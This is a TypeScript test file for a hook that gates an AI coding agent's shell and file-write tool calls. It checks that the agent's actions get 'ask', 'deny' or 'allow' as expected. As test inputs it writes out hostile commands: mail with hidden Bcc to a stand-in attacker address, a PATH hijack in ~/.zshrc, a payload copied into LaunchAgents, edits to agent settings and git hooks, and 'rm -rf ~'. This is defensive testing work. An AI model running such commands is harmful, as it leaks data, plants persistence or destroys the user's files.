/**
 * rai-shell-gate.test.ts — hook-level test for ActionGate gap #2.
 *
 * Runs the attack strings through decide() against the REAL shipped policy
 * (loadPolicyFromFile), exactly as the PreToolUse hook would. No mail is sent;
 * recipients use example.invalid.
 */
import { describe, it, expect } from 'vitest';
import { decide, loadPolicyFromFile, POLICY_PATH } from './rai-shell-gate';

const policy = loadPolicyFromFile(POLICY_PATH);

function bash(command: string) {
  return { tool_name: 'Bash', tool_input: { command }, cwd: '/Users/tim/rai' };
}
function fileWrite(tool_name: string, file_path: string) {
  return { tool_name, tool_input: { file_path }, cwd: '/Users/tim/rai' };
}

describe('rai-shell-gate decide() — real policy, hidden recipients -> ask', () => {
  const asks: Array<[string, string]> = [
    ['mail -b bcc', 'echo body | mail -b attacker@example.invalid victim@example.invalid'],
    [
      'sendmail Bcc header',
      "printf 'To: a@example.invalid\\nBcc: attacker@example.invalid\\n\\nhi' | sendmail -t",
    ],
    [
      'curl --mail-rcpt',
      'curl --mail-rcpt attacker@example.invalid --mail-from me@example.invalid smtp://localhost',
    ],
    ['python smtplib', 'python3 -c "import smtplib; s=smtplib.SMTP(\'localhost\')"'],
  ];

  for (const [name, command] of asks) {
    it(`${name} -> ask`, () => {
      const v = decide(bash(command), policy);
      expect(v.decision).toBe('ask');
    });
  }
});

describe('rai-shell-gate decide() — real policy, persistence surfaces -> ask', () => {
  it('append to ~/.zshrc -> ask', () => {
    const v = decide(bash("echo 'export PATH=/tmp/evil:$PATH' >> ~/.zshrc"), policy);
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('cp into ~/Library/LaunchAgents -> ask', () => {
    const v = decide(
      bash('cp payload.plist ~/Library/LaunchAgents/com.attacker.agent.plist'),
      policy,
    );
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('Edit of ~/.claude/settings.json -> ask', () => {
    const v = decide(fileWrite('Edit', '/Users/tim/.claude/settings.json'), policy);
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });

  it('Write into .git/hooks -> ask', () => {
    const v = decide(fileWrite('Write', '/Users/tim/rai/.git/hooks/pre-commit'), policy);
    expect(v.decision).toBe('ask');
    expect(v.rule).toBe('persistence-path');
  });
});

describe('rai-shell-gate decide() — real policy, deny still wins', () => {
  it('rm -rf ~ -> deny', () => {
    const v = decide(bash('rm -rf ~'), policy);
    expect(v.decision).toBe('deny');
  });
});

describe('rai-shell-gate decide() — real policy, normal work -> allow', () => {
  it('git status -> allow', () => {
    expect(decide(bash('git status'), policy).decision).toBe('allow');
  });
  it('npm run build -> allow', () => {
    expect(decide(bash('npm run build'), policy).decision).toBe('allow');
  });
  it('Edit of a normal project file -> allow', () => {
    expect(
      decide(fileWrite('Edit', '/Users/tim/rai/packages/core/scanner.ts'), policy)
        .decision,
    ).toBe('allow');
  });
  it('Write of a normal project file -> allow', () => {
    expect(
      decide(fileWrite('Write', '/Users/tim/rai/packages/core/README.md'), policy).decision,
    ).toBe('allow');
  });
});
